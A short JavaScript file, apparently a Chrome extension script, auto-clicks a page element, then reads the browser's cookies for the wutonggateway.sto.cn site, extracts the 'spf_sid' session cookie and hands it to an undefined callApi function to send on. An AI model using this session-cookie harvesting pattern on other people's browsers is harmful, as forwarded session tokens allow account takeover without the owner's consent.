function clickDivWhenReady(className) {
  const targetNode = document.body;
  const config = { attributes: false, childList: true, subtree: true };
  
  const observer = new MutationObserver(function(mutationsList) {
    for(const mutation of mutationsList) {
      if (mutation.type === 'childList') {
        const element = document.querySelector(`.${className}`);
        if (element) {
          observer.disconnect(); // 停止观察，因为我们找到了目标元素
          element.click();
          return;
        }
      }
    }
  });
  
  observer.observe(targetNode, config); // 开始观察文档变化
}

// 立即检查一次，以防元素已经存在
clickDivWhenReady('navigation-list-item-content');
var url = 'https://wutonggateway.sto.cn';
chrome.cookies.getAll({url: url}, function(cookies) {
  let cookiesText = '';
  for (var i = 0; i < cookies.length; i++) {
    var cookie = cookies[i];
    //console.info('cookieName: ', cookie.name);
    //console.info('cookieValue: ', cookie.value);
    if(cookie.name == 'spf_sid') {
      cookiesText += cookie.name + '=' + cookie.value + (i < cookies.length - 1 ? '; ' : '');
      callApi(cookiesText);
      console.info('send cookies: ', cookiesText);
    }
  }
});